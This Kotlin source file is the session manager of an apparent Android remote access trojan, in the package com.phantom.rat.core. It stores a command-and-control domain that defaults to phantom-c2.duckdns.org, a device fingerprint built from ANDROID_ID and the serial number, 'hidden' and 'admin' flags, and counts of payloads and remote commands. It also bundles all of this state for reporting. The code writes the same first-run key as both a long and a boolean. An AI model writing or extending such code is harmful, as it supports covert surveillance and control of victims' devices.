package com.phantom.rat.core

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.provider.Settings
import org.json.JSONArray
import org.json.JSONObject
import java.security.SecureRandom
import java.util.*

class SessionManager(private val context: Context) {

    private val prefs: SharedPreferences = context.getSharedPreferences("phantom_session", Context.MODE_PRIVATE)
    private val editor: SharedPreferences.Editor = prefs.edit()
    private val secureRandom = SecureRandom()

    companion object {
        private const val KEY_DEVICE_ID = "device_id"
        private const val KEY_SESSION_TOKEN = "session_token"
        private const val KEY_C2_DOMAIN = "c2_domain"
        private const val KEY_LAST_CONNECTED = "last_connected"
        private const val KEY_CONNECTED_SESSIONS = "connected_sessions"
        private const val KEY_PAYLOADS_CREATED = "payloads_created"
        private const val KEY_COMMANDS_SENT = "commands_sent"
        private const val KEY_COMMANDS_RECEIVED = "commands_received"
        private const val KEY_FIRST_RUN = "first_run"
        private const val KEY_IS_HIDDEN = "is_hidden"
        private const val KEY_IS_ADMIN = "is_admin"
        private const val KEY_BOOT_COUNT = "boot_count"
        private const val KEY_UPTIME = "uptime"
        private const val KEY_CONFIG = "app_config"
    }

    init {
        if (prefs.getBoolean(KEY_FIRST_RUN, true)) {
            initializeSession()
        }
    }

    private fun initializeSession() {
        editor.apply {
            putString(KEY_DEVICE_ID, generateDeviceId())
            putString(KEY_SESSION_TOKEN, generateSessionToken())
            putLong(KEY_FIRST_RUN, System.currentTimeMillis())
            putBoolean(KEY_FIRST_RUN, false)
            putInt(KEY_BOOT_COUNT, 0)
            putLong(KEY_UPTIME, System.currentTimeMillis())
            apply()
        }
    }

    fun getDeviceId(): String {
        var id = prefs.getString(KEY_DEVICE_ID, null)
        if (id == null) {
            id = generateDeviceId()
            editor.putString(KEY_DEVICE_ID, id).apply()
        }
        return id
    }

    fun getSessionToken(): String {
        var token = prefs.getString(KEY_SESSION_TOKEN, null)
        if (token == null) {
            token = generateSessionToken()
            editor.putString(KEY_SESSION_TOKEN, token).apply()
        }
        return token
    }

    fun setC2Domain(domain: String) {
        editor.putString(KEY_C2_DOMAIN, domain).apply()
    }

    fun getC2Domain(): String {
        return prefs.getString(KEY_C2_DOMAIN, "phantom-c2.duckdns.org") ?: "phantom-c2.duckdns.org"
    }

    fun addConnectedSession(sessionId: String, sessionData: JSONObject) {
        val sessions = getConnectedSessions()
        sessions.put(JSONObject().apply {
            put("id", sessionId)
            put("connected_at", System.currentTimeMillis())
            put("data", sessionData.toString())
        })
        editor.putString(KEY_CONNECTED_SESSIONS, sessions.toString()).apply()
    }

    fun getConnectedSessions(): JSONArray {
        val data = prefs.getString(KEY_CONNECTED_SESSIONS, "[]") ?: "[]"
        return try {
            JSONArray(data)
        } catch (_: Exception) {
            JSONArray()
        }
    }

    fun getSessionStats(): Map<String, Int> {
        return mapOf(
            "active" to getConnectedSessions().length(),
            "payloads" to prefs.getInt(KEY_PAYLOADS_CREATED, 0),
            "commands_sent" to prefs.getInt(KEY_COMMANDS_SENT, 0),
            "commands_received" to prefs.getInt(KEY_COMMANDS_RECEIVED, 0)
        )
    }

    fun incrementPayloadsCreated() {
        editor.putInt(KEY_PAYLOADS_CREATED, prefs.getInt(KEY_PAYLOADS_CREATED, 0) + 1).apply()
    }

    fun incrementCommandsSent() {
        editor.putInt(KEY_COMMANDS_SENT, prefs.getInt(KEY_COMMANDS_SENT, 0) + 1).apply()
    }

    fun incrementCommandsReceived() {
        editor.putInt(KEY_COMMANDS_RECEIVED, prefs.getInt(KEY_COMMANDS_RECEIVED, 0) + 1).apply()
    }

    fun isHidden(): Boolean = prefs.getBoolean(KEY_IS_HIDDEN, false)

    fun setHidden(hidden: Boolean) {
        editor.putBoolean(KEY_IS_HIDDEN, hidden).apply()
    }

    fun isAdmin(): Boolean = prefs.getBoolean(KEY_IS_ADMIN, false)

    fun setAdmin(admin: Boolean) {
        editor.putBoolean(KEY_IS_ADMIN, admin).apply()
    }

    fun getBootCount(): Int = prefs.getInt(KEY_BOOT_COUNT, 0)

    fun incrementBootCount() {
        editor.putInt(KEY_BOOT_COUNT, prefs.getInt(KEY_BOOT_COUNT, 0) + 1).apply()
    }

    fun getUptime(): Long = System.currentTimeMillis() - prefs.getLong(KEY_UPTIME, System.currentTimeMillis())

    fun saveConfig(key: String, value: String) {
        val config = getConfig()
        config.put(key, value)
        editor.putString(KEY_CONFIG, config.toString()).apply()
    }

    fun getConfig(): JSONObject {
        val data = prefs.getString(KEY_CONFIG, "{}") ?: "{}"
        return try {
            JSONObject(data)
        } catch (_: Exception) {
            JSONObject()
        }
    }

    fun getConfig(key: String, default: String = ""): String {
        return getConfig().optString(key, default)
    }

    fun clearSession() {
        editor.clear().apply()
        initializeSession()
    }

    fun isFirstRunAfterBoot(): Boolean {
        val savedBootCount = prefs.getInt(KEY_BOOT_COUNT, 0)
        return savedBootCount == 0
    }

    fun getLastConnectedTime(): Long = prefs.getLong(KEY_LAST_CONNECTED, 0)

    fun setLastConnectedTime(time: Long = System.currentTimeMillis()) {
        editor.putLong(KEY_LAST_CONNECTED, time).apply()
    }

    fun getAllSessionData(): JSONObject {
        return JSONObject().apply {
            put("device_id", getDeviceId())
            put("session_token", getSessionToken())
            put("c2_domain", getC2Domain())
            put("is_hidden", isHidden())
            put("is_admin", isAdmin())
            put("boot_count", getBootCount())
            put("last_connected", getLastConnectedTime())
            put("uptime", getUptime())
            put("sessions", getConnectedSessions())
            put("stats", JSONObject().apply {
                put("payloads", prefs.getInt(KEY_PAYLOADS_CREATED, 0))
                put("commands_sent", prefs.getInt(KEY_COMMANDS_SENT, 0))
                put("commands_received", prefs.getInt(KEY_COMMANDS_RECEIVED, 0))
            })
            put("config", getConfig())
        }
    }

    private fun generateDeviceId(): String {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val serial = Build.SERIAL ?: "unknown"
        val random = UUID.randomUUID().toString().take(8)
        val time = System.currentTimeMillis().toString().takeLast(6)
        val raw = "$androidId:$serial:$random:$time"
        return android.util.Base64.encodeToString(
            raw.toByteArray(),
            android.util.Base64.NO_WRAP or android.util.Base64.NO_PADDING
        ).take(32)
    }

    private fun generateSessionToken(): String {
        val bytes = ByteArray(32)
        secureRandom.nextBytes(bytes)
        return android.util.Base64.encodeToString(
            bytes,
            android.util.Base64.NO_WRAP or android.util.Base64.URL_SAFE
        )
    }
}
